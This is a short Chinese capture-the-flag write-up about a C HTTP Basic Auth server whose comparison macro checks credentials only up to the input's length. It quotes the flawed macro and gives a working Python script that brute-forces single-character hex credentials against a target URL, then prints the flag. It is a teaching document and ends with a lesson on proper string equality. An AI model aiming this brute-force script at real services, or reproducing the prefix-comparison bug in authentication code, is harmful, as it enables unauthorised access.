# Cecure Cerver

## 题目简述

题目实现了一个 C 语言 HTTP Basic Auth 服务。用户名和密码是随机十六进制串，但比较宏只按用户输入的长度执行 `strncmp`。目标是把两项凭据都缩短为一个字符，从有限字符集枚举通过认证。

## 解题过程

漏洞宏为：

```c
#define STRING_EQUALS(s1, s2) (!strncmp(s1, s2, strlen(s1)))
```

登录处调用顺序是：

```c
STRING_EQUALS(username, correct_username)
STRING_EQUALS(password, correct_password)
```

因此只比较攻击者输入的前缀长度。空字符串被显式拒绝，但一字符输入只要求与真实值的首字符相同。真实用户名和密码均由十六进制字符组成，各自只需枚举 16 种，组合空间为 $16^2=256$：

```python
import itertools
import requests

base_url = input("题目根地址：").rstrip("/")
alphabet = "0123456789abcdef"
for user, password in itertools.product(alphabet, repeat=2):
    response = requests.get(f"{base_url}/", auth=(user, password))
    if response.status_code == 200:
        print(response.text)
        break
```

成功响应给出：

```text
grey{3xpl0171n6_l061c_bu65}
```

## 方法总结

字符串相等必须同时验证长度和所有字节。以攻击者输入长度作为 `strncmp` 上限实现的是“用户输入是否为正确值前缀”，不是相等；即使真实凭据很长，也会被压缩成极小枚举空间。
